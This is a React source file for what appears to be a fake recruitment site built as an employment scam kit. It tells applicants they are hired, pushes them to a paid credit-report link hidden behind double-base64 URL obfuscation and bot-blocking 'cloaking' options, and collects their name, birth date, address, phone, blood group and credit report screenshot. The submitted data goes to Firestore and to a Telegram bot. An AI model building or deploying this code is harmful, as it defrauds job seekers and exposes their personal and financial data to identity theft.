import React, { useState, useEffect } from 'react';
import { useForm } from 'react-hook-form';
import { motion, AnimatePresence } from 'motion/react';
import { BrowserRouter, Routes, Route, Link, useNavigate, useSearchParams } from 'react-router-dom';
import { 
  Search, 
  Facebook, 
  Instagram, 
  Twitter, 
  Youtube,
  Linkedin,
  Briefcase, 
  CheckCircle2, 
  ChevronRight, 
  ChevronLeft,
  Upload,
  ExternalLink,
  ShieldCheck,
  Info,
  Building2,
  Globe,
  Cpu,
  Code2,
  Rocket,
  Target,
  TrendingUp,
  Users,
  Zap,
  Shield,
  Star,
  Heart,
  Cloud,
  Database,
  Layout,
  Smartphone,
  Monitor,
  Headphones,
  Settings,
  Mail,
  Phone,
  MapPin,
  Calendar,
  Clock,
  Award,
  BookOpen,
  GraduationCap,
  Lightbulb,
  Compass,
  Anchor,
  Activity,
  BarChart3,
  PieChart,
  Layers,
  Box,
  Package,
  Truck,
  ShoppingCart,
  Lock,
  LogOut,
  Eye,
  MessageSquare,
  LayoutDashboard,
  FileText,
  MousePointer2,
  Trash2
} from 'lucide-react';
import { cn } from './lib/utils';
import { 
  FcBriefcase, FcGlobe, FcIdea, FcBullish, FcCollaboration, FcCustomerSupport, 
  FcDataConfiguration, FcDatabase, FcDepartment, FcElectronics, FcEngineering, 
  FcFactory, FcFlowChart, FcLibrary, FcMindMap, FcOrganization, FcProcess, 
  FcServices, FcSettings, FcWorkflow 
} from "react-icons/fc";
import { ApplicationFormData } from './types';
import { 
  db, 
  auth, 
  loginWithGoogle, 
  logout, 
  doc, 
  getDoc, 
  setDoc, 
  onSnapshot, 
  collection, 
  addDoc, 
  serverTimestamp,
  query,
  orderBy,
  limit,
  where,
  getDocs, 
  deleteDoc} from './firebase';
import { onAuthStateChanged, User } from 'firebase/auth';

// --- Helpers ---

const generateApplicationId = () => {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < 8; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
};

const generateScheduledCallTime = () => {
  const days = Math.floor(Math.random() * 3) + 1;
  const hours = Math.floor(Math.random() * 12) + 9; // 9 AM to 9 PM
  const minutes = Math.floor(Math.random() * 60);
  const ampm = hours >= 12 ? 'PM' : 'AM';
  const displayHours = hours > 12 ? hours - 12 : hours;
  const displayMinutes = minutes < 10 ? `0${minutes}` : minutes;
  
  const date = new Date();
  date.setDate(date.getDate() + days);
  const dateStr = date.toLocaleDateString('en-US', { weekday: 'long', month: 'long', day: 'numeric' });
  
  return `${dateStr} at ${displayHours}:${displayMinutes} ${ampm}`;
};

// --- Constants ---

const DEFAULT_REVIEW_TEXT = `We acknowledge the receipt of your application and appreciate your expressed interest.

After a preliminary review of your application, it appears that your qualifications seem to align well with our requirements. We are impressed and selecting you for the position.

However, to proceed further, we need a current credit report from you. This step helps us assess financial responsibility, particularly concerning our assets and payroll. It’s important to note that perfect credit isn’t a prerequisite; we’re simply looking for potential red flags.

We recommend obtaining your credit report from a secure credit report. This trusted source ensures the safety of your social security information. So we use a company website for background check. We ask for a credit report only for a selected job applicant.`;

const ICON_GALLERY = {
  Briefcase, Building2, Globe, Cpu, Code2, Rocket, Target, TrendingUp, Users, Zap, 
  Shield, Star, Heart, Cloud, Database, Layout, Smartphone, Monitor, Headphones, Settings, 
  Mail, Phone, MapPin, Calendar, Clock, Award, BookOpen, GraduationCap, Lightbulb, Search, 
  Compass, Anchor, Activity, BarChart3, PieChart, Layers, Box, Package, Truck, ShoppingCart,
  FcBriefcase, FcGlobe, FcIdea, FcBullish, FcCollaboration, FcCustomerSupport, 
  FcDataConfiguration, FcDatabase, FcDepartment, FcElectronics, FcEngineering, 
  FcFactory, FcFlowChart, FcLibrary, FcMindMap, FcOrganization, FcProcess, 
  FcServices, FcSettings, FcWorkflow
};

type IconName = keyof typeof ICON_GALLERY;

// --- Components ---

const Header = ({ 
  companyName, 
  logoName, 
  logoSize = 'medium',
  logoTextSize = 'text-lg md:text-2xl',
  logoTextStyle = 'font-extrabold',
  logoTextColor = 'bg-gradient-to-r from-blue-600 via-indigo-500 to-cyan-500 bg-clip-text text-transparent'
}: { 
  companyName: string, 
  logoName: IconName, 
  logoSize?: string,
  logoTextSize?: string,
  logoTextStyle?: string,
  logoTextColor?: string
}) => {
  const LogoIcon = ICON_GALLERY[logoName];
  
  const sizeClasses = logoSize === 'small' ? 'h-6 w-6 md:h-8 md:w-8' : logoSize === 'large' ? 'h-10 w-10 md:h-14 md:w-14' : 'h-8 w-8 md:h-10 md:w-10';
  const iconSizeClasses = logoSize === 'small' ? 'h-3 w-3 md:h-4 md:w-4' : logoSize === 'large' ? 'h-5 w-5 md:h-8 md:w-8' : 'h-4 w-4 md:h-6 md:w-6';

  return (
    <header className="sticky top-0 z-50 w-full border-b bg-white/80 backdrop-blur-md">
      <div className="container mx-auto flex h-16 items-center justify-between px-3 md:px-6">
        <Link to="/" className="flex items-center gap-2 shrink-0 overflow-hidden pr-2">
          <div className={cn("flex shrink-0 items-center justify-center rounded-full bg-blue-600 text-white", sizeClasses)}>
            <LogoIcon className={iconSizeClasses} />
          </div>
          <span className={cn(logoTextSize, logoTextStyle, logoTextColor, "tracking-tighter drop-shadow-sm truncate")}>{companyName}</span>
        </Link>
        <div className="flex items-center gap-2 md:gap-4 shrink-0">
          <Link to="/" className="text-sm font-medium text-slate-600 hover:text-blue-600 transition-colors hidden md:block">Jobs</Link>
          <a href="#" className="text-sm font-medium text-slate-600 hover:text-blue-600 transition-colors hidden md:block">About</a>
          <Link to="/status" className="flex items-center gap-1.5 md:gap-2 rounded-full bg-blue-600 px-3 py-1.5 md:px-4 md:py-2 text-[10px] md:text-sm font-semibold text-white hover:bg-blue-700 transition-all shadow-sm whitespace-nowrap">
            <Activity className="h-3.5 w-3.5 hidden sm:block" /> 
            <span>Application Status</span>
          </Link>
        </div>
      </div>
    </header>
  );
};

const Hero = ({ companyName }: { companyName: string }) => (
  <section className="relative min-h-[70vh] flex items-center overflow-hidden bg-slate-900 py-20 md:py-32">
    {/* Background Image with Overlay */}
    <div className="absolute inset-0 z-0">
      <img 
        src="https://images.unsplash.com/photo-1521737711867-e3b97375f902?auto=format&fit=crop&q=80&w=2000" 
        alt="Career Background" 
        className="h-full w-full object-cover opacity-30"
        referrerPolicy="no-referrer"
      />
      <div className="absolute inset-0 bg-gradient-to-r from-slate-900 via-slate-900/80 to-transparent md:bg-gradient-to-r" />
      <div className="absolute inset-0 bg-gradient-to-t from-slate-900 via-transparent to-transparent" />
    </div>

    <div className="container relative z-10 mx-auto px-4 md:px-6">
      <div className="max-w-3xl text-left">
        <motion.div
          initial={{ opacity: 0, y: -50 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, ease: "easeOut" }}
          className="inline-flex items-center rounded-full bg-blue-500/10 px-3 py-1 text-sm font-medium text-blue-400 ring-1 ring-inset ring-blue-500/20 mb-6"
        >
          We're Hiring! Explore 500+ Openings
        </motion.div>
        <motion.h1 
          initial={{ opacity: 0, x: 100 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ duration: 0.6, ease: "easeOut" }}
          className="text-4xl font-extrabold tracking-tight text-white sm:text-5xl md:text-7xl"
        >
          Find Your Desired <br className="hidden md:block" />
          <span className="text-blue-500">Job Here</span>
        </motion.h1>
        <motion.p 
          initial={{ opacity: 0, x: 100 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ duration: 0.6, delay: 0.6, ease: "easeOut" }}
          className="mt-6 max-w-xl text-lg leading-8 text-slate-300 md:text-xl"
        >
          Connecting talented professionals with innovative companies. Start your journey with us today and unlock your potential with {companyName}.
        </motion.p>
        
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 }}
          className="mt-10 flex w-full max-w-2xl flex-col gap-3 sm:flex-row"
        >
          <div className="relative flex-grow">
            <Search className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400" size={20} />
            <input 
              type="text" 
              placeholder="Job title, keywords, or company" 
              className="h-14 w-full rounded-xl border border-slate-700 bg-slate-800/50 pl-12 pr-4 text-white placeholder:text-slate-500 shadow-2xl backdrop-blur-xl focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500 transition-all"
            />
          </div>
          <button className="h-14 rounded-xl bg-blue-600 px-10 font-bold text-white shadow-lg shadow-blue-900/20 hover:bg-blue-700 hover:shadow-blue-900/40 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-slate-900 transition-all active:scale-95">
            Search Jobs
          </button>
        </motion.div>
      </div>
    </div>
  </section>
);

const JobCategories = () => {
  const categories = [
    "Recruiter", "HR Manager", "Teacher", "Bookkeeper", "Data Analyst", "Plumber", "Marketing",
    "Software Engineer", "Graphic Designer", "Project Manager", "Customer Support", "Sales Representative", "Nurse", "Accountant"
  ];

  // Duplicate categories for seamless loop
  const displayCategories = [...categories, ...categories];

  return (
    <section className="bg-white py-12 overflow-hidden">
      <div className="container mx-auto px-4 md:px-6 mb-8">
        <h2 className="text-2xl font-bold text-slate-900">Popular Categories</h2>
      </div>
      <div className="relative flex w-full">
        <motion.div 
          className="flex gap-4 whitespace-nowrap"
          animate={{ x: [0, -1000] }}
          transition={{ 
            duration: 30, 
            repeat: Infinity, 
            ease: "linear" 
          }}
        >
          {displayCategories.map((cat, idx) => (
            <button 
              key={`${cat}-${idx}`}
              className="rounded-full border border-slate-200 bg-slate-50 px-8 py-3 text-sm font-medium text-slate-700 hover:border-blue-500 hover:bg-blue-50 hover:text-blue-600 transition-all shrink-0"
            >
              {cat}
            </button>
          ))}
        </motion.div>
      </div>
    </section>
  );
};

const getVisitorInfo = async () => {
  let country = 'Unknown';
  let countryCode = 'UN';
  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    if (data.country_name) country = data.country_name;
    if (data.country_code) countryCode = data.country_code;
  } catch (e) {
    // Ignore fetch errors
  }

  const ua = navigator.userAgent;
  let browser = 'Unknown';
  if (ua.includes('Firefox')) browser = 'Firefox';
  else if (ua.includes('SamsungBrowser')) browser = 'Samsung Internet';
  else if (ua.includes('Opera') || ua.includes('OPR')) browser = 'Opera';
  else if (ua.includes('Trident')) browser = 'Internet Explorer';
  else if (ua.includes('Edge') || ua.includes('Edg')) browser = 'Edge';
  else if (ua.includes('Chrome')) browser = 'Chrome';
  else if (ua.includes('Safari')) browser = 'Safari';

  let device = 'Desktop';
  if (/Mobi|Android/i.test(ua)) device = 'Mobile';
  else if (/Tablet|iPad/i.test(ua)) device = 'Tablet';

  return { country, countryCode, browser, device };
};

const ApplicationForm = ({ 
  exampleReportImage, 
  reviewText,
  creditReportButtonText,
  creditReportUrl,
  isCloakingEnabled,
  blockBots,
  requireInteraction,
  obfuscateUrl,
  telegramBotToken,
  telegramChatId,
  step3Title,
  step4Title1,
  step4Text1,
  step4Title2,
  step4Text2,
  step4Note
}: { 
  exampleReportImage: string, 
  reviewText: string,
  creditReportButtonText: string,
  creditReportUrl: string,
  isCloakingEnabled: boolean,
  blockBots: boolean,
  requireInteraction: boolean,
  obfuscateUrl: boolean,
  telegramBotToken: string,
  telegramChatId: string,
  step3Title?: string,
  step4Title1?: string,
  step4Text1?: string,
  step4Title2?: string,
  step4Text2?: string,
  step4Note?: string
}) => {
  const [step, setStep] = useState(1);
  const [linkRevealed, setLinkRevealed] = useState(false);
  const { register, handleSubmit, watch, formState: { errors } } = useForm<ApplicationFormData>();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();

  const logClick = async () => {
    try {
      const info = await getVisitorInfo();
      await addDoc(collection(db, "visitor_logs"), {
        timestamp: serverTimestamp(),
        isClick: true,
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        country: info.country,
        countryCode: info.countryCode,
        browser: info.browser,
        device: info.device
      });
    } catch (e) {
      console.error("Failed to log click", e);
    }
  };

  const onSubmit = async (data: ApplicationFormData) => {
    setIsSubmitting(true);
    try {
      let screenshotBase64 = "";
      if (data.creditReportScreenshot && data.creditReportScreenshot.length > 0) {
        const file = data.creditReportScreenshot[0];
        screenshotBase64 = await new Promise<string>((resolve, reject) => {
          const reader = new FileReader();
          reader.onload = () => resolve(reader.result as string);
          reader.onerror = reject;
          reader.readAsDataURL(file);
        });
      }

      const appId = generateApplicationId();
      const callTime = generateScheduledCallTime();

      // 1. Save to Firestore
      const applicationData = {
        ...data,
        applicationId: appId,
        scheduledCallTime: callTime,
        creditReportScreenshot: screenshotBase64, // Save as base64 string
        submittedAt: serverTimestamp()
      };
      
      await addDoc(collection(db, "applications"), applicationData);

      // 2. Forward to Telegram if configured
      if (telegramBotToken && telegramChatId) {
        const message = `
🚀 *New Job Application*
-------------------------
🆔 *ID:* ${appId}
👤 *Name:* ${data.firstName} ${data.lastName}
📧 *Email:* ${data.email}
📱 *Phone:* ${data.phone}
💼 *Position:* ${data.position}
🎂 *DOB:* ${data.dob}
🩸 *Blood Group:* ${data.bloodGroup || 'N/A'}
🏥 *Healthcare:* ${data.healthcareInsurance || 'N/A'}
🔗 *LinkedIn:* ${data.linkedInProfile || 'N/A'}
📍 *Address:* ${data.addressLine1}, ${data.city}, ${data.zipCode}, ${data.country}
🖼️ *Screenshot:* ${screenshotBase64 ? 'Attached below' : 'Not provided'}
        `.trim();

        // Send text message
        await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'Markdown'
          })
        });

        // Send photo if available
        if (screenshotBase64) {
          // Convert base64 to blob for Telegram
          const base64Data = screenshotBase64.split(',')[1];
          const blob = await fetch(`data:image/png;base64,${base64Data}`).then(res => res.blob());
          const formData = new FormData();
          formData.append('chat_id', telegramChatId);
          formData.append('photo', blob, 'screenshot.png');
          formData.append('caption', `Screenshot from ${data.firstName} ${data.lastName} (ID: ${appId})`);

          await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
        }
      }

      // Redirect to success page
      navigate(`/success?id=${appId}&email=${data.email}`);
    } catch (error) {
      console.error("Submission failed:", error);
      alert("Failed to submit application. Please try again. Note: Large images might fail due to database limits.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const nextStep = () => setStep(s => Math.min(s + 1, 4));
  const prevStep = () => setStep(s => Math.max(s - 1, 1));

  return (
    <div className="mx-auto max-w-4xl rounded-2xl border border-slate-200 bg-white p-6 shadow-xl md:p-10 h-full transition-all duration-500">
      <div className="mb-10">
        <div className="flex items-center justify-between">
          <h2 className="text-2xl font-bold text-slate-900">Job Application Form</h2>
          <span className="text-sm font-medium text-slate-500">Step {step} of 4</span>
        </div>
        <div className="mt-4 h-2 w-full rounded-full bg-slate-100">
          <motion.div 
            className="h-full rounded-full bg-blue-600"
            initial={{ width: "25%" }}
            animate={{ width: `${(step / 4) * 100}%` }}
          />
        </div>
      </div>

      <form onSubmit={handleSubmit(onSubmit)}>
        <AnimatePresence mode="wait">
          {step === 1 && (
            <motion.div 
              key="step1"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="space-y-6"
            >
              <div className="grid gap-6 md:grid-cols-2">
                <div className="space-y-2">
                  <label className="text-sm font-semibold text-slate-700">First Name *</label>
                  <input 
                    {...register("firstName", { required: "First name is required" })}
                    className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                    placeholder="John"
                  />
                  {errors.firstName && <p className="text-xs text-red-500">{errors.firstName.message}</p>}
                </div>
                <div className="space-y-2">
                  <label className="text-sm font-semibold text-slate-700">Last Name *</label>
                  <input 
                    {...register("lastName", { required: "Last name is required" })}
                    className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                    placeholder="Doe"
                  />
                  {errors.lastName && <p className="text-xs text-red-500">{errors.lastName.message}</p>}
                </div>
              </div>
              <div className="grid gap-6 md:grid-cols-2">
                <div className="space-y-2">
                  <label className="text-sm font-semibold text-slate-700">Applying Position *</label>
                  <input 
                    {...register("position", { required: "Position is required" })}
                    className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                    placeholder="e.g. Software Engineer"
                  />
                  {errors.position && <p className="text-xs text-red-500">{errors.position.message}</p>}
                </div>
                <div className="space-y-2">
                  <label className="text-sm font-semibold text-slate-700">Date of Birth</label>
                  <input 
                    type="date"
                    {...register("dob")}
                    className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                  />
                </div>
              </div>
              <div className="grid gap-6 md:grid-cols-2">
                <div className="space-y-2">
                  <label className="text-sm font-semibold text-slate-700">Healthcare/Insurance (optional)</label>
                  <select 
                    {...register("healthcareInsurance")}
                    className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                  >
                    <option value="none">None</option>
                    <option value="yes">Yes</option>
                    <option value="no">No</option>
                  </select>
                </div>
                <div className="space-y-2">
                  <label className="text-sm font-semibold text-slate-700">Blood Group</label>
                  <input 
                    {...register("bloodGroup")}
                    className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                    placeholder="e.g. A+"
                  />
                </div>
              </div>
              <div className="grid gap-6 md:grid-cols-2">
                <div className="space-y-2">
                  <label className="text-sm font-semibold text-slate-700">Email Address *</label>
                  <input 
                    type="email"
                    {...register("email", { required: "Email is required" })}
                    className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                    placeholder="john@example.com"
                  />
                  {errors.email && <p className="text-xs text-red-500">{errors.email.message}</p>}
                </div>
                <div className="space-y-2">
                  <label className="text-sm font-semibold text-slate-700">Phone Number *</label>
                  <input 
                    type="tel"
                    {...register("phone", { required: "Phone is required" })}
                    className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                    placeholder="+1 (555) 000-0000"
                  />
                  {errors.phone && <p className="text-xs text-red-500">{errors.phone.message}</p>}
                </div>
              </div>
              <div className="flex justify-end pt-4">
                <button 
                  type="button" 
                  onClick={nextStep}
                  className="flex items-center gap-2 rounded-lg bg-blue-600 px-6 py-3 font-semibold text-white hover:bg-blue-700 transition-all active:scale-95"
                >
                  Next Step <ChevronRight size={18} />
                </button>
              </div>
            </motion.div>
          )}

          {step === 2 && (
            <motion.div 
              key="step2"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="space-y-6"
            >
              <div className="space-y-2">
                <label className="text-sm font-semibold text-slate-700">LinkedIn Profile</label>
                <input 
                  {...register("linkedInProfile")}
                  className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                  placeholder="https://linkedin.com/in/username"
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-semibold text-slate-700">Specialized Field (optional)</label>
                <input 
                  {...register("specializedField")}
                  className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                  placeholder="e.g. Cloud Architecture"
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-semibold text-slate-700">Address Line 1 *</label>
                <input 
                  {...register("addressLine1", { required: "Address is required" })}
                  className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                  placeholder="123 Main St"
                />
                {errors.addressLine1 && <p className="text-xs text-red-500">{errors.addressLine1.message}</p>}
              </div>
              <div className="grid gap-6 md:grid-cols-2">
                <div className="space-y-2">
                  <label className="text-sm font-semibold text-slate-700">City</label>
                  <input 
                    {...register("city")}
                    className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                    placeholder="New York"
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-sm font-semibold text-slate-700">Zip Code</label>
                  <input 
                    {...register("zipCode")}
                    className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                    placeholder="10001"
                  />
                </div>
              </div>
              <div className="space-y-2">
                <label className="text-sm font-semibold text-slate-700">Country *</label>
                <select 
                  {...register("country", { required: "Country is required" })}
                  className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                >
                  <option value="">Select Country</option>
                  <option value="US">United States</option>
                  <option value="CA">Canada</option>
                  <option value="GB">United Kingdom</option>
                  <option value="AU">Australia</option>
                </select>
                {errors.country && <p className="text-xs text-red-500">{errors.country.message}</p>}
              </div>

              <div className="flex justify-between pt-4">
                <button 
                  type="button" 
                  onClick={prevStep}
                  className="flex items-center gap-2 rounded-lg border border-slate-200 px-6 py-3 font-semibold text-slate-600 hover:bg-slate-50 transition-all active:scale-95"
                >
                  <ChevronLeft size={18} /> Previous
                </button>
                <button 
                  type="button" 
                  onClick={nextStep}
                  className="flex items-center gap-2 rounded-lg bg-blue-600 px-6 py-3 font-semibold text-white hover:bg-blue-700 transition-all active:scale-95"
                >
                  Next Step <ChevronRight size={18} />
                </button>
              </div>
            </motion.div>
          )}

          {step === 3 && (
            <motion.div 
              key="step3"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="space-y-6"
            >
              <div className="rounded-2xl border border-blue-100 bg-blue-50 p-3 md:p-6">
                <div className="flex gap-3 md:gap-4">
                  <div className="flex h-10 w-10 md:h-12 md:w-12 shrink-0 items-center justify-center rounded-full bg-blue-600 text-white">
                    <CheckCircle2 className="h-5 w-5 md:h-6 md:w-6" />
                  </div>
                  <div className="space-y-3 md:space-y-4">
                    <h3 
                      className="text-lg font-bold text-slate-900 md:text-2xl"
                      dangerouslySetInnerHTML={{ __html: step3Title || "Application Review" }}
                    />
                    <div 
                      className="space-y-4 text-slate-600 leading-relaxed"
                      dangerouslySetInnerHTML={{ __html: reviewText.replace(/\n/g, '<br/>') }}
                    />
                  </div>
                </div>
              </div>

              <div className="flex justify-between pt-4">
                <button 
                  type="button" 
                  onClick={prevStep}
                  className="flex items-center gap-2 rounded-lg border border-slate-200 px-6 py-3 font-semibold text-slate-600 hover:bg-slate-50 transition-all active:scale-95"
                >
                  <ChevronLeft size={18} /> Previous
                </button>
                <button 
                  type="button" 
                  onClick={nextStep}
                  className="flex items-center gap-2 rounded-lg bg-blue-600 px-6 py-3 font-semibold text-white hover:bg-blue-700 transition-all active:scale-95"
                >
                  Next Step <ChevronRight size={18} />
                </button>
              </div>
            </motion.div>
          )}

          {step === 4 && (
            <motion.div 
              key="step4"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="space-y-6"
            >
              <div className="grid gap-6 lg:grid-cols-2">
                <div className="space-y-6">
                  <div className="rounded-xl border border-blue-100 bg-blue-50 p-6">
                    <div className="flex gap-4">
                      <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-blue-600 text-white">
                        <ShieldCheck size={20} />
                      </div>
                      <div>
                        <h3 
                          className="text-lg font-bold text-slate-900"
                          dangerouslySetInnerHTML={{ __html: step4Title1 || "Financial Responsibility Assessment" }}
                        />
                        <p 
                          className="mt-2 text-sm text-slate-600 leading-relaxed"
                          dangerouslySetInnerHTML={{ __html: step4Text1 || "Visit the company link to check the credit report:" }}
                        />
                        <div className="mt-4 flex flex-wrap gap-4">
                          {requireInteraction && !linkRevealed ? (
                            <button 
                              onClick={() => setLinkRevealed(true)}
                              className="flex items-center gap-2 rounded-lg bg-slate-800 px-4 py-2 text-sm font-semibold text-white hover:bg-slate-700 transition-all"
                            >
                              Reveal Link <ExternalLink size={14} />
                            </button>
                          ) : (
                            <>
                              {(isCloakingEnabled || blockBots) ? (
                                <button 
                                  onClick={() => {
                                    logClick();
                                    try {
                                      let finalUrl = creditReportUrl;
                                      if (isCloakingEnabled) {
                                        if (obfuscateUrl) {
                                          // Decode double base64 and reverse character shift
                                          const decodedOnce = atob(creditReportUrl);
                                          const decodedTwice = atob(decodedOnce);
                                          finalUrl = decodedTwice.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 1)).join('');
                                        } else {
                                          // Standard Base64 decode
                                          finalUrl = atob(creditReportUrl);
                                        }
                                      }
                                      window.open(finalUrl, '_blank', 'noopener,noreferrer');
                                    } catch (e) {
                                      // Fallback if decoding fails
                                      window.open(creditReportUrl, '_blank', 'noopener,noreferrer');
                                    }
                                  }}
                                  className="flex items-center gap-2 rounded-lg bg-blue-600 px-4 py-2 text-sm font-semibold text-white hover:bg-blue-700 transition-all"
                                >
                                  {creditReportButtonText} <ExternalLink size={14} />
                                </button>
                              ) : (
                                <a 
                                  href={creditReportUrl} 
                                  target="_blank" 
                                  rel="nofollow noopener noreferrer"
                                  onClick={() => logClick()}
                                  className="flex items-center gap-2 rounded-lg bg-blue-600 px-4 py-2 text-sm font-semibold text-white hover:bg-blue-700 transition-all"
                                >
                                  {creditReportButtonText} <ExternalLink size={14} />
                                </a>
                              )}
                            </>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="rounded-lg border border-slate-200 p-4">
                    <h4 
                      className="font-bold text-slate-900"
                      dangerouslySetInnerHTML={{ __html: step4Title2 || "Why credit report is necessary:" }}
                    />
                    <div 
                      className="mt-3 space-y-3 text-sm text-slate-600"
                      dangerouslySetInnerHTML={{ __html: step4Text2 || `<ul>
                      <li>
                        <strong>Analysis of Financial Responsibilities:</strong> We think that a person’s general dependability and credibility can be inferred from their financial responsibilities. 
                      </li>
                      <li>
                        <strong>Integrity Evaluation:</strong> As part of our employment assessment procedure, we utilize credit records to determine an applicant’s level of honesty and integrity. 
                      </li>
                      <li>
                        <strong>Security & Compliance:</strong> This verification ensures we maintain a secure workplace by confirming financial stability and reducing potential internal risks for our corporate clients and partners.
                      </li>
                    </ul>` }}
                    />
                  </div>
                </div>

                <div className="space-y-4">
                  <div className="overflow-hidden rounded-xl border border-slate-200 bg-slate-50 shadow-sm flex flex-col items-center justify-center p-4">
                    <div className="mb-4 text-[0.7rem] font-bold text-slate-900 uppercase tracking-wider">Example Credit Report Screenshot</div>
                    <img 
                      src={exampleReportImage} 
                      alt="Example Credit Report" 
                      className="w-[180px] h-[220px] object-contain md:w-[230px] md:h-[475px] transition-all"
                      referrerPolicy="no-referrer"
                    />
                    <div className="mt-4 w-full border-t border-slate-100 pt-3 text-center text-xs text-slate-500">
                      Sample of the report you need to upload
                    </div>
                  </div>
                </div>
              </div>

              <div className="space-y-4">
                <div className="flex items-start gap-3 rounded-lg border border-slate-200 p-4">
                  <Info className="mt-0.5 shrink-0 text-blue-600" size={18} />
                  <p 
                    className="text-sm text-slate-600"
                    dangerouslySetInnerHTML={{ __html: step4Note || "<strong>Please note:</strong> that this fee will be refunded along with the joining bonus if the verification process is successfully completed." }}
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-sm font-semibold text-slate-700">Upload Your Credit Report Screenshot *</label>
                  <div className="relative flex h-40 w-full cursor-pointer flex-col items-center justify-center rounded-xl border-2 border-dashed border-slate-200 bg-slate-50 transition-all hover:bg-slate-100">
                    <input 
                      type="file" 
                      accept="image/*"
                      {...register("creditReportScreenshot", { required: "Screenshot is required" })}
                      className="absolute inset-0 z-10 cursor-pointer opacity-0"
                    />
                    <Upload className="mb-2 text-slate-400" size={32} />
                    <p className="text-sm font-medium text-slate-600">Click to upload or drag and drop</p>
                    <p className="text-xs text-slate-400">PNG, JPG up to 5MB</p>
                  </div>
                  {errors.creditReportScreenshot && <p className="text-xs text-red-500">{errors.creditReportScreenshot.message}</p>}
                </div>
              </div>

              <div className="flex justify-between pt-4">
                <button 
                  type="button" 
                  onClick={prevStep}
                  className="flex items-center gap-2 rounded-lg border border-slate-200 px-6 py-3 font-semibold text-slate-600 hover:bg-slate-50 transition-all active:scale-95"
                >
                  <ChevronLeft size={18} /> Previous
                </button>
                <button 
                  type="submit"
                  disabled={isSubmitting}
                  className={cn(
                    "rounded-lg bg-blue-600 px-8 py-3 font-semibold text-white shadow-lg hover:bg-blue-700 transition-all active:scale-95",
                    isSubmitting && "opacity-50 cursor-not-allowed"
                  )}
                >
                  {isSubmitting ? "Submitting..." : "Submit Application"}
                </button>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </form>
    </div>
  );
};

const Footer = ({ 
  companyName, 
  logoName, 
  footerText, 
  logoSize = 'medium', 
  socialLinks,
  logoTextColor = 'bg-gradient-to-r from-blue-400 via-indigo-300 to-cyan-300 bg-clip-text text-transparent'
}: { 
  companyName: string, 
  logoName: IconName, 
  footerText: string, 
  logoSize?: string, 
  socialLinks?: any,
  logoTextColor?: string
}) => {
  const LogoIcon = ICON_GALLERY[logoName];
  
  const sizeClasses = logoSize === 'small' ? 'h-6 w-6' : logoSize === 'large' ? 'h-12 w-12' : 'h-8 w-8';
  const iconSizeClasses = logoSize === 'small' ? 'h-3 w-3' : logoSize === 'large' ? 'h-6 w-6' : 'h-4 w-4';

  return (
    <footer className="border-t bg-slate-900 py-12 text-slate-400">
      <div className="container mx-auto px-4 md:px-6">
        <div className="grid gap-10 md:grid-cols-4">
